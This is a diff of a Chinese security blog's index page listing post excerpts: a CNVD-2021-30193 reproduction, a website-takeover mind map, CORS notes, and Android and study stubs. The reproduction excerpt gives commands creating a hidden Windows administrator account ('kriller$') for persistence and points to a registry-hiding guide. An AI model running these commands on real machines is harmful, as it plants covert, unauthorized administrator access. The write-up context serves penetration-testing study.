-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609162551767.png" alt="image-20210609162551767"></p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609164234717.png" alt="image-20210609164234717"></p>
-<h4 id="持续控制"><a href="#持续控制" class="headerlink" title="持续控制"></a>持续控制</h4><p>现在已经得到一个稳定的shell，并且是管理员权限。因此接下来就只需要持久控制进行权限的维持。这里选择使用<strong>Windows系统隐藏账户</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user kriller$ kriller /add</span><br><span class="line">net localgroup administrators kriller$ /add</span><br></pre></td></tr></table></figure>
-
-<p>接着修改注册表，删除用户，再导入用户信息到注册表。这样该隐藏账户的隐蔽性更高。具体步骤请参考：<a target="_blank" rel="noopener" href="https://whoamianony.top/2020/10/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/">链接</a></p>
-    
-    <a class="article-more-a" href="/2021/06/09/CNVD-2021-30193%20/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/09/CNVD-2021-30193%20/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-拿站思维导图" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="拿站思维导图"><a href="#拿站思维导图" class="headerlink" title="拿站思维导图"></a>拿站思维导图</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ol>
-<li><p>WHOIS查询（站长之家）</p>
-</li>
-<li><p>定位真实IP（绕<a target="_blank" rel="noopener" href="http://www.0xby.com/2935.html">cdn</a>、云waf）</p>
-</li>
-</ol>
-<ul>
-<li>​    DNS<a target="_blank" rel="noopener" href="https://securitytrails.com/domain/cd-hjgc.com/dns">历史解析</a></li>
-<li>​    查找子域名(Ksubdomain)</li>
-<li>​    网站邮件头信息</li>
-<li></li>
-</ul>
-<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3>
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/07/%E6%8B%BF%E7%AB%99%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安卓开发" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="安卓开发"><a href="#安卓开发" class="headerlink" title="安卓开发"></a>安卓开发</h2><h4 id="安卓四大组件："><a href="#安卓四大组件：" class="headerlink" title="安卓四大组件："></a>安卓四大组件：</h4><ul>
-<li>activity</li>
-</ul>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/05/06/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-关于学习2.0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/05/06/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A02.0/">关于学习2.0</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/05/06/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A02.0/" class="archive-article-date">
-        <time datetime="2021-05-06T12:02:00.350Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-06</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="关于学习"><a href="#关于学习" class="headerlink" title="关于学习"></a>关于学习</h2><ul>
-<li>选择与努力</li>
-<li>挫折与压力</li>
-</ul>
-    
-    <a class="article-more-a" href="/2021/05/06/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A02.0/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">方法与选择</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/随笔//" class="article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/05/06/%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A02.0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-关于CORS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/05/06/%E5%85%B3%E4%BA%8ECORS/">关于CORS</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/05/06/%E5%85%B3%E4%BA%8ECORS/" class="archive-article-date">
-        <time datetime="2021-05-06T12:02:00.340Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-06</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="CORS-知识梳理"><a href="#CORS-知识梳理" class="headerlink" title="CORS 知识梳理"></a>CORS 知识梳理</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CORS是为了解决浏览器的同源策略限制。浏览器一旦发现当前源发送了一个跨源请求（xmlhttprequest或者ajax）就会自动添加一些附加的头信息一起发送给服务器。</p>
-<p>因此只要服务器实现了cors的配置，就可以跨源通信。</p>
-<h3 id="简单请求和非简单请求"><a href="#简单请求和非简单请求" class="headerlink" title="简单请求和非简单请求"></a>简单请求和非简单请求</h3><ul>
-<li>简单请求（simple request）</li>
-</ul>
-<p>请求方式为get、head、post并且http头信息不超出五个特定字段。</p>
-<ul>
-<li>非简单请求（not-so-simple request）</li>
-</ul>
-<h3 id="跨域基本流程"><a href="#跨域基本流程" class="headerlink" title="跨域基本流程"></a>跨域基本流程</h3><p><strong>step1：</strong></p>
-<p>对于简单请求，浏览器会在请求头之中加一个Origin字段。比如：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Origin</span>: http://api.bob.com:8000</span><br><span class="line"><span class="attribute">Host</span>: api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br></pre></td></tr></table></figure>
-
-<p><code>Origin</code>字段用来说明，本次请求来自哪个源。</p>
-<p><strong>step2：</strong></p>
-<p>服务器收到这个请求会进行判断，如果这个字段值指定的源不在许可范围内会返回一个正常的响应也就是不包含access-control-origin字段。并且抛出一个错误给xmlhttprequest的回调函数。如果指定的源在许可范围内，服务器返回的响应会多出几个字段：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: http://api.bob.com:8000</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span>: FooBar</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>
-
-<p><strong>（1）Access-Control-Allow-Origin</strong></p>
-<p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>
-<p><strong>（2）Access-Control-Allow-Credentials</strong></p>
-<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>
-<p><strong>（3）Access-Control-Expose-Headers</strong></p>
-<p>该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p>
-    
-    <a class="article-more-a" href="/2021/05/06/%E5%85%B3%E4%BA%8ECORS/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/05/06/%E5%85%B3%E4%BA%8ECORS/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
     </nav>
   
 
